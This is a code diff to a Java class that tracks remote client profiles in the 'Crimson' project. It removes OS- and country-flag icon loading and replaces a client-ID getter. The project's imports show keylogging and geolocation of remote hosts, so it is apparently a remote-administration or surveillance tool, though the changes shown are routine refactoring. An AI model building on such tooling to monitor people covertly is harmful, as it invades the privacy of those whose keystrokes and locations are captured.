@@ -24,16 +24,12 @@ import javax.swing.ImageIcon;
 import org.slf4j.Logger;
 import org.slf4j.LoggerFactory;
 
-import com.subterranean_security.crimson.core.Reporter;
 import com.subterranean_security.crimson.core.attribute.keys.AKeySimple;
 import com.subterranean_security.crimson.core.platform.info.OS.OSFAMILY;
 import com.subterranean_security.crimson.core.proto.Keylogger.State;
 import com.subterranean_security.crimson.core.proto.Keylogger.Trigger;
-import com.subterranean_security.crimson.core.util.ValidationUtil;
 import com.subterranean_security.crimson.sv.keylogger.Log;
-import com.subterranean_security.crimson.universal.Universal;
 import com.subterranean_security.crimson.universal.stores.DatabaseStore;
-import com.subterranean_security.crimson.viewer.ui.UIUtil;
 
 public class ClientProfile extends Profile {
 
@@ -76,12 +72,9 @@ public class ClientProfile extends Profile {
 
 	}
 
+	// TODO remove
 	public ClientProfile initialize() {
 		if (!initialized) {
-			// load icons
-			if (Universal.instance == Universal.Instance.VIEWER) {
-				loadIcons();
-			}
 
 			// load keylog
 			keylog.pages.setDatabase(DatabaseStore.getDatabase());
@@ -90,68 +83,12 @@ public class ClientProfile extends Profile {
 		return this;
 	}
 
-	public void loadIcons() {
-		// os icon
-		if (osTypeIcon == null && get(AKeySimple.OS_NAME) != null) {
-			String icon = get(AKeySimple.OS_NAME).replaceAll(" ", "_").toLowerCase();
-
-			// filtering
-			if (icon.contains("ubuntu")) {
-				icon = "ubuntu";
-			}
-
-			// load icons or fallbacks
-			osTypeIcon = UIUtil.getIconOrFallback("icons16/platform/" + icon + ".png",
-					"icons16/platform/" + get(AKeySimple.OS_FAMILY).toLowerCase() + ".png");
-			osMonitorIcon = UIUtil.getIconOrFallback("icons32/platform/monitors/" + icon + ".png",
-					"icons32/platform/monitors/" + get(AKeySimple.OS_FAMILY).toLowerCase() + ".png");
-
-			osTypeIcon.setDescription(get(AKeySimple.OS_NAME));
-			osMonitorIcon.setDescription(get(AKeySimple.NET_HOSTNAME));
-
-		}
-
-		// location
-		if (ipLocationIcon == null && get(AKeySimple.NET_EXTERNALIP) != null) {
-			if (ValidationUtil.privateIP(get(AKeySimple.NET_EXTERNALIP))) {
-				ipLocationIcon = UIUtil.getIcon("icons16/general/localhost.png");
-				ipLocationIcon.setDescription("Private IP");
-			} else {
-				try {
-					ipLocationIcon = UIUtil
-							.getIcon("flags/" + get(AKeySimple.IPLOC_COUNTRYCODE).toLowerCase() + ".png");
-					ipLocationIcon.setDescription(get(AKeySimple.IPLOC_COUNTRY));
-				} catch (NullPointerException e) {
-					Reporter.report(Reporter.newReport()
-							.setCrComment("No location icon found: " + get(AKeySimple.IPLOC_COUNTRYCODE).toLowerCase())
-							.build());
-
-					// fall back to default
-					ipLocationIcon = UIUtil.getIcon("flags/un.png");
-					ipLocationIcon.setDescription("Unknown");
-				}
-
-			}
-
-		}
-
-	}
-
 	public int getMessageLatency() {
 		return messageLatency;
 	}
 
 	public void setMessageLatency(int messageLatency) {
 		this.messageLatency = messageLatency;
-	}
-
-	public int getCid() {
-		return cvid;
-	}
-
-	public void setCid(int cid) {
-		this.cvid = cid;
-		set(AKeySimple.CLIENT_CID, "" + cid);
 	}
 
 	public ImageIcon getLocationIcon() {
@@ -235,7 +172,7 @@ public class ClientProfile extends Profile {
 	public static class CidComparator implements Comparator<ClientProfile> {
 		@Override
 		public int compare(ClientProfile o1, ClientProfile o2) {
-			return o1.getCid() - o2.getCid();
+			return o1.getCvid() - o2.getCvid();
 		}
 	}
 
